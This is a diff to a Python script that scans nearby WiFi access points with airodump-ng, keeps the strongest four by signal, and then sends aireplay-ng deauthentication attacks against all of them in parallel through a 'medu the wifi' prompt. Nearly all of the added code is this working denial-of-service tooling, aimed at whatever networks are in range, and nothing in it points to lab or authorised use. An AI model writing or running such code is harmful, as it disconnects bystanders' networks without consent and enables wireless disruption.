@@ -3,7 +3,8 @@
 import sys,os,platform
 import time
 import subprocess
-from threading import Timer
+import multiprocessing
+import threading
 import pandas as pd
 
 
@@ -51,7 +52,7 @@ def start_monitorMode():
 
 def getting_bssid():
     InterFace=find_interface()
-    act_bssid="timeout 10s airodump-ng -w out --output-format csv "+InterFace
+    act_bssid="timeout 9s airodump-ng -w out --output-format csv "+InterFace
     print(act_bssid.split())
     try:
         cmd_bssid = subprocess.run(
@@ -61,11 +62,30 @@ def getting_bssid():
         print("sucessfull data")
 
     read_file = pd.read_csv('./out-01.csv')
-    bssids = a.loc[:,['BSSID',' channel',' ESSID']]
+    read_file = read_file.sort_values(" Power",ascending = False,)
+    read_file = read_file.loc[(read_file[" Power"]<=-10) & (read_file[" Power"]>=-80)]
+    bssids = read_file.loc[:,['BSSID',' channel',' ESSID',' Power']]
     bssids = bssids.dropna()
+    print(bssids)
 
+    return bssids,InterFace
 
+def deauth_one(BSSID,InterFace):
+    cmd_deauth="aireplay-ng --deauth 10 -a "+ BSSID +" "+InterFace
+    print(cmd_deauth.split(" "))
+    process_deauth = subprocess.Popen(cmd_deauth.split(" "),stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
+    stdout,stderr = process_deauth.communicate()
+    print(stdout)
+    print("output")
 
+def deauth_all(bssids,InterFace):
+    all_process=[]
+    for i in range(4):
+        process = multiprocessing.Process(target=deauth_one ,args=(bssids.iloc[i,0],InterFace))
+        process.start()
+        all_process.append(process)
+    for p in all_process:
+        p.join()
     pass
 
 
@@ -74,8 +94,9 @@ def medula():
     print("medu the wifi y/n")
     x=input()
     if(x=="y"):
-        # start_monitorMode()
-        getting_bssid()
+        start_monitorMode()
+        bssids,InterFace=getting_bssid()
+        deauth_all(bssids,InterFace)
         print("yahooo")
 
     else:
